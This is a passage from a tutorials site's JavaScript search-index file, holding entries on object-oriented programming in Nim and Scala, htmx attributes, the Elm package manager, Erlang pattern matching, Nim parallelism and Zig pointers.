                title: "Object-Oriented Programming in Nim",
                description: "Nim Lang description",
                content: "Nim supports object-oriented programming (OOP) principles, including member functions (methods), inheritance, and polymorphism. This guide will help you understand how to use these features effectively.\nMember Functions (Methods) linkMember functions, or methods, in Nim can be implemented using procedures (procs). Thanks to the Uniform Function Call Syntax (UFCS), you can call procs as if they were methods.\ntype Animal = object name: string age: int proc speak(self: Animal, msg: string) = echo self.name \u0026 \" says: \" \u0026 msg var sparky = Animal(name: \"Sparky\", age: 10) sparky.speak(\"Hi\") # Method call syntax speak(sparky, \"Hi\") # Traditional proc call syntax UFCS allows calling procs with dot notation, making the code more readable and object-oriented.\nproc double(num: int): int = return num * 2 echo double(10) # Traditional call echo 10.double() # UFCS call echo 10.double # UFCS call without parentheses Mutability in Methods linkWhen using UFCS and procs as member functions, it’s crucial to handle mutability correctly. By default, proc arguments are immutable.\ntype Animal = object name: string age: int proc incAge(self: Animal) = self.age += 1 # Error: self.age is immutable proc setName(self: Animal, name: string) = self.name = name # Error: self.name cannot be assigned to To modify the object’s state, mark the argument as mutable using var.\nproc incAge(self: var Animal) = self.age += 1 proc setName(self: var Animal, name: string) = self.name = name var sparky = Animal(name: \"Sparky\", age: 3) sparky.incAge() sparky.setName(\"Spark\") For ref objects, mutability is managed through pointers, making them inherently mutable.\ntype Animal = ref object name: string age: int proc incAge(self: Animal) = self.age += 1 var sparky = Animal(name: \"Sparky\", age: 3) sparky.incAge() Inheritance linkNim supports inheritance, allowing you to create subtypes and override methods. Use the of keyword to create a subtype and method to define dynamically dispatched methods.\ntype Animal = ref object of RootObj name: string age: int method vocalize(self: Animal): string {.base.} = \"...\" method ageHumanYrs(self: Animal): int {.base.} = self.age type Dog = ref object of Animal method vocalize(self: Dog): string = \"woof\" method ageHumanYrs(self: Dog): int = self.age * 7 type Cat = ref object of Animal method vocalize(self: Cat): string = \"meow\" var animals: seq[Animal] = @[] animals.add(Dog(name: \"Sparky\", age: 10)) animals.add(Cat(name: \"Mitten\", age: 10)) for a in animals: echo a.vocalize() echo a.ageHumanYrs() Output:\nwoof 70 meow 10 Procs vs. Methods linkProcs are statically dispatched, making them more performant than dynamically dispatched methods. Use methods only when you need dynamic dispatch.\nTesting Subtypes linkYou can check if an object is of a given subtype using the of keyword.\necho(animals[0] of Dog) # true echo(animals[0] of Cat) # false echo(animals[0] of Animal) # true Summary link Procs: Use for static dispatch, more performant. Methods: Use for dynamic dispatch, useful for polymorphism. UFCS: Allows calling procs with dot notation for a more OOP-like syntax. Mutability: Mark arguments as var for mutable access in procs. Inheritance: Use of keyword for creating subtypes and overriding methods. By following these guidelines, you can leverage Nim’s OOP features to write clean, efficient, and maintainable code.\n"
            }
        );
    index.add(
            {
                id:  195 ,
                href: "\/tutorials\/docs\/scala\/scala\/object_oriented_programming\/",
                title: "Object-Oriented Programming in Scala",
                description: "Scala Lang description",
                content: "Object-Oriented Programming in Scala linkScala treats everything as objects and supports key object-oriented programming (OOP) concepts such as classes, objects, constructors, inheritance, and traits.\nClasses and Objects\nClasses: A class in Scala is a blueprint for creating objects. It can contain fields and methods.\nclass Person(var name: String, var age: Int) { def greet(): Unit = { println(s\"Hello, my name is $name and I am $age years old.\") } } Objects: An instance of a class is known as an object. You create an object using the new keyword.\nval person1 = new Person(\"Kanye\", 300) person1.greet() Primary and Auxiliary Constructors\nPrimary Constructor: Defined in the class signature. It can have default values.\nclass Person(var name: String = \"Unknown\", var age: Int = 0) Auxiliary Constructor: Allows you to have additional constructors. They must call the primary constructor.\nclass Person(var name: String, var age: Int) { def this(name: String) = this(name, 0) // Auxiliary Constructor } Inheritance and Traits\nInheritance: Scala supports single inheritance, where a class can extend another class.\nclass Employee(name: String, age: Int, var salary: Double) extends Person(name, age) Traits: Similar to interfaces in Java, traits are used to define object types by specifying the signature of the supported methods.\ntrait Greeting { def greet(message: String): Unit } class Person(var name: String) extends Greeting { def greet(message: String): Unit = println(s\"$name says: $message\") } Code Example: Object-Oriented Scala Program\nHere’s an example combining these OOP concepts:\ntrait Greeting { def greet(): Unit } class Person(var name: String, var age: Int) extends Greeting { override def greet(): Unit = { println(s\"Hello, I'm $name and I am $age years old.\") } } object MainApp { def main(args: Array[String]): Unit = { val person1 = new Person(\"Alice\", 25) person1.greet() } } This program defines a Person class with a trait Greeting. When we create an instance of Person, it can use the greet method from the trait.\n"
            }
        );
    index.add(
            {
                id:  196 ,
                href: "\/tutorials\/docs\/ocaml\/",
                title: "Ocaml",
                description: "OCaml (originally Objective Caml) is a versatile, general-purpose, multi-paradigm programming language. It seamlessly blends functional, imperative, and object-oriented programming styles, empowering developers to choose the most suitable approach for different tasks. Developed in the mid-1990s by INRIA, the French National Institute for Research in Computer Science and Control, OCaml offers exceptional reliability and security, making it ideal for mission-critical systems.",
                content: ""
            }
        );
    index.add(
            {
                id:  197 ,
                href: "\/tutorials\/docs\/htmx\/htmx\/some_hx_attributes\/",
                title: "Other hx-Attributes",
                description: "Learn about what HTMX is and how you can use it.",
                content: "Other hx-Attributes linkIndicators linkYou can specify an element that should be shown or hidden when the request is in flight using the hx-indicator attribute.\nHere is a div that hides itself and shows a spinner when it is loading:\nLoad the slow content Indicators are shown when a request is initiated, and hidden when the request is finished.\nSelecting Content to Swap linkYou can select a portion of the response to use for the swap, instead of using the entire response, using the hx-select attribute. The value of this attribute is a CSS selector that will be run against the response. If the selector matches more than one element, they will all be swapped into the target. Here is a div that will use only the #sub-content from the response, rather than the entire response:\nClick Me! Here is an example of HTML you might get back from /slow:\n\u003c!doctype html\u003e My Title This content was slow! URL Variables linkSometimes you want to refer to the value of an input in a URL. You can do this with the hx-vals attribute. The value of the attribute should be a JSON object with keys that are the names of the variables you want to insert into the URL. Here is a div that will use the value of an input with the name of “page” in the URL:\nClick Me! Pushing States linkhtmx supports the HTML5 History API via the hx-push-url attribute. When this attribute is present, the URL of the page will be updated whenever a request is made. Here is a div that will update the URL to /foo when clicked:\nClick Me! When clicked, the div will load the content from /foo into the div, and the URL will be updated to /foo. This allows you to easily create single-page applications with htmx.\nHandling Request \u0026 Response Headers linkhtmx supports the hx-headers attribute, which allows you to set custom headers on the request. Here is a div that will set the X-My-Header header to “My Value”:\nClick Me! htmx also supports the hx-trigger-headers attribute, which allows you to set custom headers on the request based on the triggering event. Here is a div that will set the X-My-Header header to “My Value” when clicked:\nClick Me! Other Headers linkhtmx supports a number of other headers that can be used to customize the behavior of the request and response.\nHX-Trigger - This header can be used to trigger client side events when a response is received. Here is a response that will trigger the foo event on the body: HX-Trigger: foo HX-Trigger-After-Settle - This header can be used to trigger client side events when the request is settled (e.g. after all swaps have been completed). Here is a response that will trigger the foo event on the body after the request is settled: HX-Trigger-After-Settle: foo HX-Trigger-After-Swap - This header can be used to trigger client side events when the swap is completed. Here is a response that will trigger the foo event on the body after the swap is completed: HX-Trigger-After-Swap: foo HX-Push - This header can be used to push a new URL to the history stack. Here is a response that will push the URL /foo to the history stack: HX-Push: /foo HX-Replace-Url - This header can be used to replace the current URL in the history stack. Here is a response that will replace the current URL with /foo: HX-Replace-Url: /foo HX-Redirect - This header can be used to redirect the browser to a new URL. Here is a response that will redirect the browser to /foo: HX-Redirect: /foo Polling linkhtmx supports polling via the hx-trigger attribute. Here is a div that will poll the /clock endpoint every second:\nLoading... Polling can be stopped by removing the hx-trigger attribute. Here is a button that will stop the polling:\nStop Polling Here is the /stop_polling endpoint that will stop the polling:\nPolling Stopped Progress Indicator linkhtmx supports progress indicators via the hx-indicator attribute. Here is a div that will show a spinner while the request is in flight:\nClick Me! The indicator will be shown when the request is initiated, and hidden when the request is finished.\nWebSockets linkhtmx supports WebSockets via the hx-ws attribute. Here is a div that will connect to a WebSocket and send a message when clicked:\nClick Me! The hx-ws attribute can also be used to receive messages from a WebSocket. Here is a div that will receive messages from a WebSocket and update itself:\nWaiting for update... SSE linkhtmx supports Server-Sent Events via the hx-sse attribute. Here is a div that will connect to an SSE endpoint and update itself with the received message:\nWaiting for update... The hx-sse attribute can also be used to send messages to an SSE endpoint. Here is a div that will send a message to an SSE endpoint when clicked:\nClick Me! Client Side Events linkhtmx supports client side events via the hx-on attribute. Here is a div that will trigger the foo event on the body when clicked:\nClick Me! The hx-on attribute can also be used to listen for events. Here is a div that will listen for the foo event and update itself:\nWaiting for foo... "
            }
        );
    index.add(
            {
                id:  198 ,
                href: "\/tutorials\/docs\/elm\/elm\/elms_package_manager\/",
                title: "Package Manager in Elm",
                description: "Handling HTTP requests and JSON data in Elm.",
                content: "A package manager is a command-line tool that automates the process of installing, upgrading, configuring, and removing packages in your application.\nJust like JavaScript has a package manager called npm, elm has a package manager called elm-package.\nThe package manager performs the following three tasks −\nInstalls all dependencies that an elm application need Publishes custom packages Determines the version of your package when you are ready to publish and update. Elm Package Manager Commands linkThe following table lists down the various Elm package manager commands −\nSr. No.\tCommand\tSyntax\tDescription\ninstall, elm-package install\tInstalls packages to use locally\npublish\telm-package publish\tPublishes your package to the central catalog\nbump\telm-package bump\tBumps version numbers based on API changes\ndiff\telm-package diff\tGets differences between two APIs In order to publish your package, you need to host source code on GitHub and have the version properly labeled with a git tag. Following illustration shows how to use elm-package manager to pull an external dependency.\nIllustration - Installing svg package In this example, we will see how to integrate Scalable Vector Graphics(SVG) into an elm application.\nStep 1 − Create a folder elmSvgApp\nStep 2 − Install svg package using the following command −\nelm-package install elm-lang/svg Step 3 − Install Create a SvgDemo.elm file and type the content given below. We import Svg module to draw a rectangle of 100x100 dimension and fill the colour red.\nimport Svg exposing (..) import Svg.Attributes exposing (..) main = svg [ width \"120\" , height \"120\" , viewBox \"0 0 120 120\" ] [ rect [ x \"10\" , y \"10\" , width \"100\" , height \"100\" , rx \"15\" , ry \"15\" ,fill \"red\" ] [] ] Step 4 − Now build the project using elm make .\\SvgDemo.elm. This will generate an index.html and you can open it on your browser.\n"
            }
        );
    index.add(
            {
                id:  199 ,
                href: "\/tutorials\/docs\/pandas\/",
                title: "pandas",
                description: "`pandas` is arguably the most important Python package for data analysis. It is the de facto standard package for data manipulation and exploratory data analysis. Its ability to read from and write to an extensive list of formats makes it a versatile tool for data science practitioners. Its data manipulation functions make it a highly accessible and practical tool for aggregating, analyzing, and cleaning data.",
                content: ""
            }
        );
    index.add(
            {
                id:  200 ,
                href: "\/tutorials\/docs\/nim\/nim\/parallelism_in_nim\/",
                title: "Parallelism in Nim",
                description: "Nim Lang description",
                content: "Parallelism in Nim allows you to execute multiple tasks concurrently, leveraging multiple threads. There are several ways to achieve parallelism, including using threads directly or utilizing higher-level abstractions like threadpool.\nEnabling Threads linkBefore using parallelism features, you need to enable threads at compile time:\nnim --threads:on c threads.nim Using Threads Directly link proc sayHi(num: int) {.thread.} = echo \"Hi from \" \u0026 $num var threads: array[10, Thread[int]] for i in threads.low..threads.high: createThread(threads[i], sayHi, i) joinThreads(threads) Explanation:\nsayHi: A procedure marked with {.thread.} to run in parallel. threads: An array of thread objects. createThread: Creates a new thread for each iteration, executing sayHi. joinThreads: Waits for all threads to complete. Using threadpool link import threadpool proc sayHi(num: int) {.thread.} = echo \"Hi from \" \u0026 $num for i in 0..9: spawn sayHi(i) sync() Explanation:\nspawn: Creates a new thread to execute sayHi for each iteration. sync(): Waits for all spawned threads to complete. Other Options link Experimental parallel Statement: Nim provides an experimental parallel statement for parallel execution of code blocks. Returning Data from spawn Calls: It’s possible to return data from spawn calls using channels or other synchronization mechanisms. Considerations link Performance: Choose the approach that best fits your use case and consider the performance implications of each method. Error Handling: Implement proper error handling for parallel code to manage exceptions and ensure graceful termination. Parallelism in Nim offers flexibility and scalability, allowing you to efficiently utilize multiple threads to execute tasks concurrently.\n"
            }
        );
    index.add(
            {
                id:  201 ,
                href: "\/tutorials\/docs\/erlang\/erlang\/pattern_matching\/",
                title: "Pattern Matching in Erlang",
                description: "Pattern matching is a fundamental concept in Erlang that allows you to destructure data structures, bind variables, and control the flow of your program. This tutorial will guide you through the basics of pattern matching, including how to use it with different data types and the rules governing pattern matching success and failure.\nIntroduction to Pattern Matching linkIn Erlang, patterns look similar to terms. They can be simple literals like atoms and numbers, or compound structures like tuples and lists.",
                content: "Pattern matching is a fundamental concept in Erlang that allows you to destructure data structures, bind variables, and control the flow of your program. This tutorial will guide you through the basics of pattern matching, including how to use it with different data types and the rules governing pattern matching success and failure.\nIntroduction to Pattern Matching linkIn Erlang, patterns look similar to terms. They can be simple literals like atoms and numbers, or compound structures like tuples and lists. Patterns can also contain variables, which are alphanumeric strings starting with a capital letter or an underscore. The special “anonymous variable” _ is used when you want to ignore the value being matched.\nA pattern matches a term if they have the same “shape” and if any atoms and literals in the pattern are identical to those in the term. Variables in the pattern will be bound to corresponding values in the term.\nBasic Examples linkHere are some simple examples of pattern matching:\nB = 1. 2 = 2. {ok, C} = {ok, 40}. [H|T] = [1, 2, 3, 4]. B = 1. matches because B is a variable and can be bound to the value 1. 2 = 2. matches because both sides are the same literal. {ok, C} = {ok, 40}. matches because the tuples have the same structure and the atom ok matches. C is bound to 40. [H|T] = [1, 2, 3, 4]. matches because the list [1, 2, 3, 4] can be split into head H (which is 1) and tail T (which is [2, 3, 4]). Compound Data Structures linkPattern matching can be used with compound data structures such as tuples and lists:\n{ok, Value} = {ok, 100}. % Matches and binds Value to 100 [First, Second | Rest] = [a, b, c, d]. % Matches and binds First to 'a', Second to 'b', and Rest to '[c, d]' Pattern Matching Failures linkPattern matching fails if the patterns do not align with the terms. When this happens, an error is generated and the process exits. Here are some examples:\n1 = 2. % Fails because 1 is not equal to 2 {ok, A} = {failure, \"Error message\"}. % Fails because the atoms 'ok' and 'failure' do not match [H|T] = []. % Fails because the list is empty and cannot be split into head and tail Using Pattern Matching in Functions linkPattern matching is extensively used to select which function clause to execute. Here’s an example:\n-module(math). -export([factorial/1]). factorial(0) -\u003e 1; factorial(N) when N \u003e 0 -\u003e N * factorial(N - 1). In this example, the first clause matches when N is 0, and the second clause matches for any positive integer N.\nError Handling linkWhen pattern matching fails, it generates an error that can be trapped and handled using try...catch or by monitoring processes. This allows you to build robust applications that can handle unexpected values gracefully.\nExample: link -module(error_handling). -export([safe_divide/2]). safe_divide(A, B) -\u003e try A / B catch error:badarith -\u003e {error, \"Division by zero\"} end. In this example, attempting to divide by zero is caught and handled, returning a descriptive error tuple instead of crashing.\nConclusion linkPattern matching in Erlang is a powerful feature that simplifies working with complex data structures and controlling the flow of your program. By understanding how to use pattern matching effectively, you can write more concise and readable code. Remember to handle pattern matching failures gracefully to build robust applications.\n"
            }
        );
    index.add(
            {
                id:  202 ,
                href: "\/tutorials\/docs\/zig\/zig\/pointers_in_zig\/",
                title: "Pointers in Zig",
                description: "Zig is a general-purpose programming language and toolchain for maintaining robust, optimal, and reusable software.",
                content: "Pointers linkZig doesn’t include a garbage collector. The burden of managing memory is on you, the developer. It’s a big responsibility as it has a direct impact on the performance, stability and security of your application.\nWe’ll begin by talking about pointers, which is an important topic to discuss in and of itself, but also to start training ourselves to see our program’s data from a memory-oriented point of view. If you’re already comfortable with pointers, heap allocations and dangling pointers, feel free to skip ahead a couple of parts to heap memory \u0026 allocators, which is more Zig-specific.\nThe following code creates a user with a power of 100, and then calls the levelUp function which increments the user’s power by 1. Can you guess the output?\nconst std = @import(\"std\"); pub fn main() void { var user = User{ .id = 1, .power = 100, }; // this line has been added levelUp(user); std.debug.print(\"User {d} has power of {d}\\n\", .{user.id, user.power}); } fn levelUp(user: User) void { user.power += 1; } pub const User = struct { id: u64, power: i32, }; That was a unkind trick; the code won’t compile: local variable is never mutated. This is in reference to the user variable in main. A variable that is never mutated must be declare const. You might be thinking: but in levelUp we are mutating user, what gives? Let’s assume the Zig compiler is mistaken and trick it. We’ll force the compiler to see that user is mutated:\nconst std = @import(\"std\"); pub fn main() void { var user = User{ .id = 1, .power = 100, }; user.power += 0; // rest of the code is the same Now we get an error in levelUp: cannot assign to constant. We saw in part 1 that function parameters are constants, thus user.power += 1; is not valid. To fix the compile-time error, we could change the levelUp function to:\nfn levelUp(user: User) void { var u = user; u.power += 1; } Which will compile, but our output is User 1 has power of 100, even though the intent of our code is clearly for levelUp to increase the user’s power to 101. What’s happening?\nTo understand, it helps to think about data with respect to memory, and variables as labels that associate a type with a specific memory location. For example, in main, we create a User. A simple visualization of this data in memory would be:\nuser -\u003e ------------ (id) | 1 | ------------ (power) | 100 | ------------ There are two important things to note. The first is that our user variable points to the beginning of our structure. The second is that the fields are laid out sequentially. Remember that our user also has a type. That type tells us that id is a 64 bit integer and power is a 32 bit integer. Armed with a reference to the start of our data and the type, the compiler can translate user.power to: access a 32 bit integer located 64 bits from the beginning. That’s the power of variables, they reference memory and include the type information necessary to understand and manipulate the memory in a meaningful way.\nBy default, Zig doesn’t make guarantees about the memory layout of structures. It could store fields in alphabetical order, by ascending size, or with gaps. It can do what it wants, so long as it’s able to translate our code correctly. This freedom can enable certain optimizations. Only if we declare a packed struct will we get strong guarantees about the memory layout. We can also create an extern struct which guarantees a that the memory layout will match the C Application Binary Interface (ABI). Still, our visualization of user is reasonable and useful.\nHere’s a slightly different visualization which includes memory addresses. The memory address of the start of this data is a random address I came up with. This is the memory address referenced by the user variable, which is also the value of our first field, id. However, given this initial address, all subsequent addresses have a known relative address. Since id is a 64 bit integer, it takes 8 bytes of memory. Therefore, power has to be at $start_address + 8:\nuser -\u003e ------------ (id: 1043368d0) | 1 | ------------ (power: 1043368d8) | 100 | ------------ To verify this for yourself, I’d like to introduce the addressof operator: \u0026. As the name implies, the addressof operator returns the address of an variable (it can also return the address of a function, isn’t that something?!). Keeping the existing User definition, try this main:\npub fn main() void { const user = User{ .id = 1, .power = 100, }; std.debug.print(\"{*}\\n{*}\\n{*}\\n\", .{\u0026user, \u0026user.id, \u0026user.power}); } This code prints the address of user, user.id and user.power. You might get different results based on your platform and other factors, but hopefully you’ll see that the address of user and user.id are the same, while user.power is at an 8 byte offset. I got:\nlearning.User@1043368d0 u64@1043368d0 i32@1043368d8 The addressof operator returns a pointer to a value. A pointer to a value is a distinct type. The address of a value of type T is a *T. We pronounce that a pointer to T. Therefore, if we take the address of user, we’ll get a *User, or a pointer to User:\npub fn main() void { var user = User{ .id = 1, .power = 100, }; user.power += 0; const user_p = \u0026user; std.debug.print(\"{any}\\n\", .{@TypeOf(user_p)}); } Our original goal was to increase our user’s power by 1, via the levelUp function. We got the code to compile, but when we printed power it was still the original value. It’s a bit of a leap, but let’s change the code to print the address of user in main and in levelUp:\npub fn main() void { var user = User{ .id = 1, .power = 100, }; user.power += 0; // added this std.debug.print(\"main: {*}\\n\", .{\u0026user}); levelUp(user); std.debug.print(\"User {d} has power of {d}\\n\", .{user.id, user.power}); } fn levelUp(user: User) void { // add this std.debug.print(\"levelUp: {*}\\n\", .{\u0026user}); var u = user; u.power += 1; } If you run this, you’ll get two different addresses. This means that the user being modified in levelUp is different from the user in main. This happens because Zig passes a copy of the value. That might seem like a strange default, but one of the benefits is that the caller of a function can be sure that the function won’t modify the parameter (because it can’t). In a lot of cases, that’s a good thing to have guaranteed. Of course, sometimes, like with levelUp, we want the function to modify a parameter. To achieve this, we need levelUp to act on the actual user in main, not a copy. We can do this by passing the address of our user into the function:\nconst std = @import(\"std\"); pub fn main() void { var user = User{ .id = 1, .power = 100, }; // no longer needed // user.power += 1; // user -\u003e \u0026user levelUp(\u0026user); std.debug.print(\"User {d} has power of {d}\\n\", .{user.id, user.power}); } // User -\u003e *User fn levelUp(user: *User) void { user.power += 1; } pub const User = struct { id: u64, power: i32, }; We had to make two changes. The first is calling levelUp with the address of user, i.e. \u0026user, instead of user. This means that our function no longer receives a User. Instead, it receives a *User, which was our second change.\nWe no longer need that ugly hack of forcing user to be mutated via user.power += 0;. Initially, we failed to get the code to compile because user was a var; the compiler told us it was never mutated. We thought maybe the compiler was wrong and “tricked” it by forcing a mutation. But, as we now know, the user being mutated in levelUp was a different; the compiler was right.\nThe code now works as intended. There are still many subtleties with function parameters and our memory model in general, but we’re making progress. Now might be a good time to mention that, aside from the specific syntax, none of this is unique to Zig. The model that we’re exploring here is the most common, some languages might just hide many of the details, and thus flexibility, from developers.\nMethods linkMore than likely, you’d have written levelUp as a method of the User structure:\npub const User = struct { id: u64, power: i32, fn levelUp(user: *User) void { user.power += 1; } }; This begs the question: how do we call a method with a pointer receiver? Maybe we have to do something like: \u0026user.levelUp()? Actually, you just call it normally, i.e. user.levelUp(). Zig knows that the method expects a pointer and passes the value correctly (by reference).\nI initially chose a function because it’s explicit and thus easier to learn from.\nConstant Function Parameters linkI more than implied that, by default, Zig will pass a copy of a value (called “pass by value”). Shortly we’ll see that the reality is a bit more subtle (hint: what about complex values with nested objects?)\nEven sticking with simple types, the truth is that Zig can pass parameters however it wants, so long as it can guarantee that the intent of the code is preserved. In our original levelUp, where the parameter was a User, Zig could have passed a copy of the user or a reference to main.user, as long as it could guarantee that the function would not mutate it. (I know we ultimately did want it mutated, but by making the type User, we were telling the compiler that we didn’t).\nThis freedom allows Zig to use the most optimal strategy based on the parameter type. Small types, like User, can be cheaply passed by value (i.e. copied). Larger types might be cheaper to pass by reference. Zig can use any approach, so long as the intent of the code is preserved. To some degree, this is made possible by having constant function parameters.\nNow you know one of the reasons function parameters are constants.\nMaybe you’re wondering how passing by reference could ever be slower, even compared to copying a really small structure. We’ll see this more clearly next, but the gist is that doing user.power when user is a pointer adds a tiny bit of overhead. The compiler has to weigh the cost of copying versus the cost of accessing fields indirectly through a pointer. Pointer to Pointer We previous looked at what the memory of user within our main function looked like. Now that we’ve changed levelUp what would its memory look like?:\nmain: user -\u003e ------------ (id: 1043368d0) \u003c--- | 1 | | ------------ (power: 1043368d8) | | 100 | | ------------ | | ............. empty space | ............. or other data | | levelUp: | user -\u003e ------------- (*User) | | 1043368d0 |---------------------- ------------- Within levelUp, user is a pointer to a User. Its value is an address. Not just any address, of course, but the address of main.user. It’s worth being explicit that the user variable in levelUp represents a concrete value. This value happens to be an address. And, it’s not just an address, it’s also a type, a *User. It’s all very consistent, it doesn’t matter if we’re talking about pointers or not: variables associate type information with an address. The only special thing about pointers is that, when we use the dot syntax, e.g. user.power, Zig, knowing that user is a pointer, will automatically follow the address.\nSome languages require a different symbol when accessing a field through a pointer. What’s important to understand is that the user variable in levelUp itself exists in memory at some address. Just like we did before, we can see this for ourselves:\nfn levelUp(user: *User) void { std.debug.print(\"{*}\\n{*}\\n\", .{\u0026user, user}); user.power += 1; } The above prints the address the user variable references as well as its value, which is the address of the user in main.\nIf user is a *User, then what is \u0026user? It’s a **User, or a pointer to a pointer to a User. I can do this until one of us runs out of memory!\nThere are use-cases for multiple levels of indirection, but is isn’t anything we need right now. The purpose of this section is to show that pointers aren’t special, they’re just a value, which is an address, and a type.\nNested Pointers linkUp until now, our User has been simple, containing two integers. It’s easy to visualize its memory and, when we talk about “copying”, there isn’t any ambiguity. But what happens when User becomes more complex and contains a pointer?\npub const User = struct { id: u64, power: i32, name: []const u8, }; We’ve added name which is a slice. Recall that a slice is a length and a pointer. If we initialized our user with the name of “Goku”, what would it look like in memory?\nuser -\u003e ------------- (id: 1043368d0) | 1 | ------------- (power: 1043368d8) | 100 | ------------- (name.len: 1043368dc) | 4 | ------------- (name.ptr: 1043368e4) ------| 1182145c0 | | ------------- | | ............. empty space | ............. or other data | ---\u003e ------------- (1182145c0) | 'G' | ------------- | 'o' | ------------- | 'k' | ------------- | 'u' | ------------- The new name field is a slice which is made up of a len and ptr field. These are laid out in sequence along with all the other fields. On a 64 bit platform both len and ptr will be 64 bits, or 8 bytes. The interesting part is the value of name.ptr: it’s an address to some other place in memory.\nSince we used a string literal, user.name.ptr will point to a specific location within the area where all the constants are stored inside our binary. Types can get much more complex than this with deep nesting. But simple or complex, they all behave the same. Specifically, if we go back to our original code where levelUp took a plain User and Zig provided a copy, how would that look now that we have a nested pointer?\nThe answer is that only a shallow copy of the value is made. Or, as some put it, only the memory immediately addressable by the variable is copied. It might seem like levelUp would get a half-baked copy of user, possibly with an invalid name. But remember that a pointer, like our user.name.ptr is a value, and that value is an address. A copy of an address is still the same address:\nmain: user -\u003e ------------- (id: 1043368d0) | 1 | ------------- (power: 1043368d8) | 100 | ------------- (name.len: 1043368dc) | 4 | ------------- (name.ptr: 1043368e4) | 1182145c0 |------------------------- levelUp: user -\u003e ------------- (id: 1043368ec) | | 1 | | ------------- (power: 1043368f4) | | 100 | | ------------- (name.len: 1043368f8) | | 4 | | ------------- (name.ptr: 104336900) | | 1182145c0 |------------------------- ------------- | | ............. empty space | ............. or other data | | ------------- (1182145c0) \u003c--- | 'G' | ------------- | 'o' | ------------- | 'k' | ------------- | 'u' | ------------- From the above, we can see that shallow copying will work. Since a pointer’s value is an address, copying the value means we get the same address. This has important implications with respect to mutability. Our function can’t mutate the fields directly accessible by main.user since it got a copy, but it does have access to the same name, so can it mutate that? In this specific case, no, name is a const. Plus, our value “Goku” is a string literal which are always immutable. But, with a bit of work, we can see the implication of shallow copying:\nconst std = @import(\"std\"); pub fn main() void { var name = [4]u8{'G', 'o', 'k', 'u'}; const user = User{ .id = 1, .power = 100, // slice it, [4]u8 -\u003e []u8 .name = name[0..], }; levelUp(user); std.debug.print(\"{s}\\n\", .{user.name}); } fn levelUp(user: User) void { user.name[2] = '!'; } pub const User = struct { id: u64, power: i32, // []const u8 -\u003e []u8 name: []u8 }; The above code prints “Go!u”. We had to change name’s type from []const u8 to []u8 and instead of a string literal, which are always immutable, create an array and slice it. Some might see inconsistency here. Passing by value prevents a function from mutating immediate fields, but not fields with a value behind a pointer. If we did want name to be immutable, we should have declared it as a []const u8 instead of a []u8.\nSome languages have a different implementation, but many languages work exactly like this (or very close). While all of this might seem esoteric, it’s fundamental to day to day programming. The good news is that you can master this using simple examples and snippets; it doesn’t get more complicated as other parts of the system grow in complexity.\nRecursive Structures linkSometimes you need a structure to be recursive. Keeping our existing code, let’s add an optional manager of type ?User to our User. While we’re at it, we’ll create two Users and assign one as the manager to another:\nconst std = @import(\"std\"); pub fn main() void { const leto = User{ .id = 1, .power = 9001, .manager = null, }; const duncan = User{ .id = 1, .power = 9001, .manager = leto, }; std.debug.print(\"{any}\\n{any}\", .{leto, duncan}); } pub const User = struct { id: u64, power: i32, manager: ?User, }; This code won’t compile: struct ’learning.User’ depends on itself. This fails because every type has to have a known compile-time size.\nWe didn’t run into this problem when we added name even though names can be different lengths. The issue isn’t with the size of values, it’s with the size of the types themselves. Zig needs this knowledge to do everything we talked about above, like accessing a field based on its offset position. name was a slice, a []const u8, and that has a known size: 16 bytes - 8 bytes for len and 8 bytes for ptr.\nYou might think this is going to be a problem with any optional or union. But for both optionals and unions, the largest possible size is known and Zig can use that. A recursive structure has no such upper-bound, the structure could recurse once, twice or millions of times. That number would vary from User to User and would not be known at compile time.\nWe saw the answer with name: use a pointer. Pointers always take usize bytes. On a 64-bit platform, that’s 8 bytes. Just like the actual name “Goku” wasn’t stored with/along our user, using a pointer means our manager is no longer tied to the user’s memory layout.\nconst std = @import(\"std\"); pub fn main() void { const leto = User{ .id = 1, .power = 9001, .manager = null, }; const duncan = User{ .id = 1, .power = 9001, // changed from leto -\u003e \u0026leto .manager = \u0026leto, }; std.debug.print(\"{any}\\n{any}\", .{leto, duncan}); } pub const User = struct { id: u64, power: i32, // changed from ?const User -\u003e ?*const User manager: ?*const User, }; You might never need a recursive structure, but this isn’t about data modeling. It’s about understanding pointers and memory models and better understanding what the compiler is up to.\nA lot of developers struggle with pointers, there can be something elusive about them. They don’t feel concrete like an integer, or string or User. None of this has to be crystal clear for you to move forward. But it is worth mastering, and not just for Zig. These details might be hidden in languages like Ruby, Python and JavaScript, and to a lesser extent C#, Java and Go, but they’re still there, impacting how you write code and how that code runs. So take your time, play with examples, add debug print statements to look at variables and their address. The more you explore, the clearer it will get.\n"
            }
        );
    index.add(
            {
                id:  203 ,
                href: "\/tutorials\/docs\/erlang\/erlang\/applications_and_best_practices\/",
                title: "Practical Applications and Best Practices",
                description: "Explore real-world applications and best practices in Erlang programming.",
                content: "Practical Applications and Best Practices linkReal-World Applications of Erlang linkErlang’s unique features make it a preferred choice in several critical industries:\nCase Studies linkWhatsApp: One of the most well-known examples, WhatsApp uses Erlang to handle its messaging infrastructure. Erlang’s ability to support massive concurrency and its fault tolerance ensures that millions of messages are delivered reliably every day.\nEricsson: As the creator of Erlang, Ericsson uses it extensively in its telecommunications infrastructure, benefiting from its robustness and ability to manage large-scale concurrent activities.\nKlarna: A leading online payment solution provider, Klarna leverages Erlang for its backend systems, ensuring high availability and reliability in processing financial transactions.\nIndustry Use-Cases linkErlang is extensively used in sectors requiring scalable, fault-tolerant systems, such as:\nBanking: For transaction processing systems that need high reliability. E-commerce: To handle large volumes of transactions and customer interactions. Telecommunications: For managing calls, messages, and data sessions. Cloud Computing: To build scalable and resilient cloud-based services. Best Practices in Erlang Programming linkAdopting best practices is crucial for writing efficient, maintainable, and scalable Erlang code:\nCode Organization link Modular Design: Organize your code into modules, each responsible for specific functionality. This improves readability and maintainability. OTP Design Principles: Follow the Open Telecom Platform (OTP) design principles, which provide a set of frameworks and libraries for building robust applications. Clear Documentation: Maintain clear and comprehensive documentation for your modules and functions to facilitate collaboration and maintenance. Performance Optimization link Profiling and Optimization: Use tools like fprof and eprof for profiling your code to identify and optimize performance bottlenecks. Efficient Memory Management: Be mindful of memory usage, especially with large data structures and processes. Garbage Collection: Understand how Erlang’s garbage collection works to optimize memory use and performance. Testing and Documentation link Comprehensive Testing: Write extensive tests using tools like EUnit and Common Test to ensure your code behaves as expected. Documentation: Provide thorough documentation for your codebase, including specifications, usage examples, and detailed explanations of complex logic. Code Example: Code Organization and Documentation link -module(my_module). -author(\"Your Name\"). %% @doc This function adds two numbers. %% @spec add(number(), number()) -\u003e number(). add(Number1, Number2) -\u003e Number1 